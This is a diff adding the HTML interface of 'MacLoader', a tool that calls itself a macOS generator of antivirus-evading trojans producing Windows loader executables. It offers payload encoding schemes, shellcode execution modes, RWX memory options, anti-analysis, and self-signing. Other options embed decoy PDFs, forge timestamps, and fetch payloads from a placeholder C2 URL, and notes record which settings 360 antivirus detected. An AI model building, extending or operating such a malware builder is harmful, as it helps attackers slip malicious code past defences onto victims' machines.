@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>MacLoader</title>
+<link rel="stylesheet" href="style.css" />
+</head>
+<body class="view-c2">
+
+<div class="window">
+
+  <!-- ==================== 左侧边栏 ==================== -->
+  <aside class="sidebar" id="sidebar">
+    <div class="traffic" data-tauri-drag-region>
+      <span class="tl tl-close"></span><span class="tl tl-min"></span><span class="tl tl-max"></span>
+    </div>
+
+    <div class="appid">
+      <img class="appid-logo" src="logo.png" alt="MacLoader" />
+      <span class="appid-name">MacLoader</span>
+    </div>
+
+    <nav class="nav" id="nav">
+      <button class="navitem active" data-view="c2" data-title="C2 免杀" data-badge="构建">
+        <svg class="ni" viewBox="0 0 20 20"><rect x="2.4" y="3.4" width="15.2" height="13.2" rx="2"/><path d="M2.4 7.4h15.2"/><path d="M6.2 11.4 8 13.2l3.6-3.6"/></svg>
+        C2 免杀
+      </button>
+      <button class="navitem" data-view="ws" data-title="Webshell 免杀" data-badge="开发中">
+        <svg class="ni" viewBox="0 0 20 20"><circle cx="10" cy="10" r="7.4"/><path d="M2.8 10h14.4"/><path d="M10 2.6c2 2.2 3 4.7 3 7.4s-1 5.2-3 7.4c-2-2.2-3-4.7-3-7.4s1-5.2 3-7.4z"/></svg>
+        Webshell 免杀
+      </button>
+    </nav>
+
+    <nav class="nav nav-bottom">
+      <button class="navitem" data-view="settings" data-title="设置" data-badge="">
+        <svg class="ni" viewBox="0 0 20 20"><circle cx="10" cy="10" r="2.6"/><path d="M10 2.4v2.2M10 15.4v2.2M17.6 10h-2.2M4.6 10H2.4M15.4 4.6l-1.6 1.6M6.2 13.8l-1.6 1.6M15.4 15.4l-1.6-1.6M6.2 6.2 4.6 4.6"/></svg>
+        设置
+      </button>
+      <button class="navitem" data-view="about" data-title="关于" data-badge="">
+        <svg class="ni" viewBox="0 0 20 20"><circle cx="10" cy="10" r="7.3"/><path d="M10 9.2v5"/><circle cx="10" cy="6.3" r=".75" fill="currentColor"/></svg>
+        关于
+      </button>
+    </nav>
+  </aside>
+
+  <!-- ==================== 右侧主面板 ==================== -->
+  <section class="pane">
+
+    <header class="toolbar" data-tauri-drag-region>
+      <div class="tb-left">
+        <h1 id="viewTitle">C2 免杀</h1>
+        <span class="badge" id="viewBadge">构建</span>
+      </div>
+      <div class="tb-right">
+        <div class="env" id="env">
+          <span class="dot"></span><span id="envText">检测编译环境…</span>
+        </div>
+        <button class="iconbtn" id="drawerBtn" title="编译日志">
+          <svg class="ic-list" viewBox="0 0 20 20" width="16" height="16"><path d="M3.4 4.6h13.2M3.4 10h13.2M3.4 15.4h8.2" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+          <svg class="ic-close" viewBox="0 0 20 20" width="16" height="16"><path d="M5.6 5.6l8.8 8.8M14.4 5.6l-8.8 8.8" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+        </button>
+        <button id="genBtn" class="primary">生成 exe</button>
+      </div>
+    </header>
+
+    <!-- 预设分段控件（替代原来的下拉框） -->
+    <div class="segbar">
+      <div class="segmented" id="segPreset" role="tablist" aria-label="实测预设">
+        <button class="seg active" data-preset="">不使用预设</button>
+        <button class="seg" data-preset="std">标准组</button>
+        <button class="seg" data-preset="b32">b32</button>
+        <button class="seg" data-preset="prot_auto">prot_auto</button>
+        <button class="seg" data-preset="prot_rwx">prot_rwx</button>
+      </div>
+      <div class="hint" id="segHint">
+        <svg viewBox="0 0 20 20" width="14" height="14"><circle cx="10" cy="10" r="7.4" fill="none" stroke="currentColor" stroke-width="1.5"/><path d="M10 9v5.2" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><circle cx="10" cy="6.3" r=".85" fill="currentColor"/></svg>
+        <span>实测通过组合，一键套用</span>
+      </div>
+    </div>
+
+    <!-- ============ Webshell 免杀：未开发占位 ============ -->
+    <div class="pageview" id="wsView">
+      <div class="phbox">
+        <div class="ph-art"><svg viewBox="0 0 24 24"><path d="M8.6 7.4 3.8 12l4.8 4.6"/><path d="M15.4 7.4 20.2 12l-4.8 4.6"/><path d="M13.4 4.6 10.6 19.4"/></svg></div>
+        <h2>Webshell 免杀</h2>
+        <p>该模块正在开发中，敬请期待</p>
+      </div>
+    </div>
+
+    <!-- ==================== 设置 ==================== -->
+    <div class="pageview" id="settingsView">
+      <div class="settings">
+        <section class="card">
+          <div class="cardhead">
+            <span class="ic"><svg viewBox="0 0 20 20"><circle cx="10" cy="10" r="6.6"/><path d="M10 3.4a6.6 6.6 0 0 1 0 13.2z" fill="currentColor" stroke="none"/></svg></span>
+            <h3>外观</h3>
+          </div>
+          <div class="f"><span class="lab">主题</span>
+            <select id="themeSel">
+              <option value="light">浅色</option>
+              <option value="dark">深色</option>
+              <option value="auto">跟随系统</option>
+            </select>
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <!-- ==================== 关于 ==================== -->
+    <div class="pageview" id="aboutView">
+      <div class="about">
+        <img class="about-logo" src="logo.png" alt="MacLoader" />
+        <h2>MacLoader</h2>
+        <p class="about-sub">macOS 免杀马生成器</p>
+        <dl class="about-rows">
+          <div class="arow"><dt>版本</dt><dd>1.1.0</dd></div>
+          <div class="arow"><dt>构建</dt><dd class="mono">Tauri 2 · Rust (arm64)</dd></div>
+          <div class="arow"><dt>产物平台</dt><dd class="mono">Windows PE · x64 / x86</dd></div>
+        </dl>
+      </div>
+    </div>
+
+    <div class="main">
+      <div class="scroll">
+        <div class="grid" id="grid">
+          <div class="col">
+            <section class="card">
+              <div class="cardhead">
+                <span class="ic"><svg viewBox="0 0 20 20"><path d="M11.6 2.5H6.2a1.7 1.7 0 0 0-1.7 1.7v11.6a1.7 1.7 0 0 0 1.7 1.7h7.6a1.7 1.7 0 0 0 1.7-1.7V6.4z"/><path d="M11.6 2.5v3.9h3.9"/></svg></span>
+                <h3>载荷</h3>
+              </div>
+              <div class="f"><span class="lab">有效载荷</span>
+                <div class="row">
+                  <input id="payload" type="text" placeholder=".bin / .raw / .c / .txt" />
+                  <button class="ghost" data-pick="file" data-target="payload">浏览</button>
+                </div>
+              </div>
+              <div class="f"><span class="lab">输出文件名</span>
+                <input id="outName" type="text" value="loader.exe" /></div>
+              <div class="f"><span class="lab">输出目录</span>
+                <div class="row">
+                  <input id="outDir" type="text" placeholder="留空 = 当前目录" />
+                  <button class="ghost" data-pick="dir" data-target="outDir">选择</button>
+                </div>
+              </div>
+            </section>
+            <section class="card">
+              <div class="cardhead">
+                <span class="ic"><svg viewBox="0 0 20 20"><circle cx="10" cy="10" r="7.3"/><circle cx="10" cy="10" r="3.4"/><circle cx="10" cy="10" r=".4" fill="currentColor"/></svg></span>
+                <h3>目标</h3>
+              </div>
+              <div class="g2">
+                <div class="f"><span class="lab">架构</span>
+                  <select id="arch"><option value="x64">x64</option><option value="x86">x86</option></select></div>
+                <div class="f"><span class="lab">窗口</span>
+                  <select id="console"><option value="gui">无黑框</option><option value="console">控制台</option></select></div>
+              </div>
+              <div class="f"><span class="lab">内存保护</span>
+                <select id="protect">
+                  <option value="rx">仅 RX（默认）</option>
+                  <option value="auto">自动（自写时升 RWX）</option>
+                  <option value="rwx">RWX（自解密载荷）</option>
+                </select>
+              </div>
+            </section>
+          </div>
+
+          <div class="col">
+            <section class="card">
+              <div class="cardhead">
+                <span class="ic"><svg viewBox="0 0 20 20"><path d="M7.2 6.2 3.4 10l3.8 3.8"/><path d="M12.8 6.2 16.6 10l-3.8 3.8"/></svg></span>
+                <h3>编码与执行</h3>
+              </div>
+              <div class="g2">
+                <div class="f"><span class="lab">编码形态</span>
+                  <select id="encoding">
+                    <option value="chunk">分块变密钥</option>
+                    <option value="b32">Base32 字母表</option>
+                    <option value="chunk_r">分块 + 随机倒序</option>
+                    <option value="auto">自动（全随机）</option>
+                    <option value="b64">Base64 分段</option>
+                    <option value="uuid">UUID + XOR</option>
+                    <option value="raw">明文数组</option>
+                  </select>
+                </div>
+                <div class="f"><span class="lab">执行方式</span>
+                  <select id="mode">
+                    <option value="direct">direct</option>
+                    <option value="fiber">fiber</option>
+                    <option value="callback">callback</option>
+                  </select>
+                </div>
+              </div>
+              <small id="encWarn" class="warn hidden">⚠ 该编码形态在实测中被 360 查杀</small>
+              <small id="modeWarn" class="warn hidden">⚠ fiber / callback 实测被 360 查杀，仅 direct 通过</small>
+              <label class="cb"><input type="checkbox" id="h_obf" checked /><b>编译期代码随机化</b></label>
+              <label class="cb"><input type="checkbox" id="h_anti" /><b>反分析严格模式</b></label>
+            </section>
+            <section class="card">
+              <div class="cardhead">
+                <span class="ic"><svg viewBox="0 0 20 20"><rect x="2.6" y="3.6" width="14.8" height="12.8" rx="2"/><circle cx="7.4" cy="8" r="1.5"/><path d="m3.2 14.6 4.3-4.3 3.1 3.1 2.6-2.6 3.6 3.6"/></svg></span>
+                <h3>图标</h3>
+              </div>
+              <div class="icongrid" id="iconGrid">
+                <button class="iconitem active" data-icon="" title="不使用图标">
+                  <span class="defmark">无</span>
+                </button>
+              </div>
+              <div class="row">
+                <input id="iconPath" type="text" placeholder="自定义 .ico / .png / .jpg" />
+                <button class="ghost" data-pick="icon" data-target="iconPath">浏览</button>
+              </div>
+            </section>
+          </div>
+
+          <div class="col">
+            <section class="card">
+              <div class="cardhead">
+                <span class="ic"><svg viewBox="0 0 20 20"><path d="M10 2.6 4 5v5c0 3.5 2.5 6.7 6 7.4 3.5-.7 6-3.9 6-7.4V5z"/><path d="m7.4 10.2 1.9 1.9 3.4-3.6"/></svg></span>
+                <h3>资源与签名</h3>
+              </div>
+              <label class="cb"><input type="checkbox" id="h_res" checked /><b>完整资源伪装</b></label>
+              <label class="cb"><input type="checkbox" id="h_sign" checked /><b>Authenticode 自签名</b></label>
+              <div class="f"><span class="lab">时间戳服务器 (TSA)</span>
+                <input id="tsaUrl" type="text" value="http://tsa.wotrus.com" /></div>
+            </section>
+            <section class="card">
+              <div class="cardhead">
+                <span class="ic"><svg viewBox="0 0 20 20"><path d="M13.6 8.4 8.7 13.3a2.4 2.4 0 0 1-3.4-3.4l5.6-5.6a3.2 3.2 0 0 1 4.5 4.5l-5.6 5.6"/></svg></span>
+                <h3>诱饵文档</h3>
+              </div>
+              <div class="f">
+                <div class="row"><input id="decoyPath" type="text" placeholder="选择要内嵌的 PDF" />
+                  <button class="ghost" data-pick="pdf" data-target="decoyPath">浏览</button></div>
+              </div>
+            </section>
+            <section class="card">
+              <div class="cardhead">
+                <span class="ic"><svg viewBox="0 0 20 20"><circle cx="10" cy="10" r="7.3"/><path d="M10 5.8V10l2.9 1.8"/></svg></span>
+                <h3>元数据与加载</h3>
+              </div>
+              <div class="g2">
+                <div class="f"><span class="lab">创建时间伪造</span>
+                  <select id="timeMode">
+                    <option value="random">随机（近两年）</option>
+                    <option value="custom">指定时间</option>
+                    <option value="none">不修改</option>
+                  </select>
+                </div>
+                <div class="f"><span class="lab">加载方式</span>
+                  <select id="loadMode">
+                    <option value="embed">本地内嵌</option>
+                    <option value="remote">远程 URL</option>
+                  </select>
+                </div>
+              </div>
+              <div class="f hidden" id="timeRow"><span class="lab">时间值 (UTC)</span>
+                <input id="timeValue" type="datetime-local" value="2024-11-15T08:30" /></div>
+              <div class="f hidden" id="urlRow"><span class="lab">载荷 URL</span>
+                <input id="remoteUrl" type="text" placeholder="https://your-c2/payload.bin" /></div>
+            </section>
+          </div>
+        </div>
+      </div>
+
+      <!-- ==================== 右侧日志抽屉 ==================== -->
+      <aside class="logbar" id="logBar">
+        <div class="loghead">
+          <h2>编译日志</h2>
+          <div class="logacts">
+            <button class="ghost sm" id="clearLogBtn">清空</button>
+            <button class="ghost sm" id="toggleLogBtn">收起</button>
+          </div>
+        </div>
+        <div id="result" class="result hidden"></div>
+        <pre id="log">就绪。选择 payload 后点击「生成 exe」。</pre>
+      </aside>
+    </div>
+
+    <footer class="foot">
+      <div class="summary" id="summary"></div>
+    </footer>
+  </section>
+</div>
+
+<!-- 收起/展开边栏按钮：必须放在侧栏之外，否则侧栏收起时会被自身的 overflow 一起裁掉 -->
+<button class="collapse" id="collapseBtn" title="收起边栏" aria-label="收起边栏">
+  <svg viewBox="0 0 16 16" width="14" height="14"><path d="M10 3.5 5.5 8l4.5 4.5" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M12.5 3.5 8 8l4.5 4.5" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+</button>
+
+<!-- 产物列表（保留功能，平时不占视觉空间） -->
+<section class="history-hidden">
+  <div class="histhead">
+    <input id="listDir" type="text" placeholder="列出目录中的 exe" />
+    <button class="ghost" data-pick="dir" data-target="listDir">选择</button>
+    <button class="ghost" id="refreshBtn">刷新</button>
+  </div>
+  <table id="histTable">
+    <thead><tr><th>文件名</th><th>大小</th><th>修改时间</th><th></th></tr></thead>
+    <tbody></tbody>
+  </table>
+</section>
+
+<!-- app.js 依赖但界面已移除的控件：保留隐藏元素，避免取值报错 -->
+<div class="hidden">
+  <input id="xorKey" type="text" value="" />
+  <input id="h_msg" type="checkbox" checked />
+  <select id="preset">
+    <option value="">预设…</option>
+    <option value="std">标准组</option>
+    <option value="b32">b32</option>
+    <option value="prot_auto">prot_auto</option>
+    <option value="prot_rwx">prot_rwx</option>
+  </select>
+</div>
+
+<!-- ==================== 首次启动：依赖安装引导 ==================== -->
+<div class="onboard hidden" id="onboard">
+  <div class="ob-card">
+    <div class="ob-head">
+      <img class="ob-logo" src="logo.png" alt="" />
+      <h2 id="obTitle">缺少编译环境</h2>
+      <p id="obSub">生成 exe 需要下列工具链，安装一次即可长期使用。</p>
+    </div>
+
+    <ul class="ob-list" id="obList"></ul>
+
+    <div class="ob-total" id="obTotal"></div>
+
+    <div class="ob-prog hidden" id="obProg">
+      <div class="ob-bar"><i id="obBar"></i></div>
+      <div class="ob-status" id="obStatus">准备中…</div>
+      <pre class="ob-log" id="obLog"></pre>
+    </div>
+
+    <div class="ob-nobrew hidden" id="obNoBrew">
+      <b>本机没有 Homebrew</b>
+      <span>先在终端跑下面这条命令装好 Homebrew，再回来点「重新检测」：</span>
+      <code>/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"</code>
+    </div>
+
+    <div class="ob-actions">
+      <button class="ghost" id="obSkip">以后再说</button>
+      <button class="primary" id="obInstall">一键安装</button>
+    </div>
+  </div>
+</div>
+
+<script src="app.js"></script>
+<script src="shell.js"></script>
+</body>
+</html>
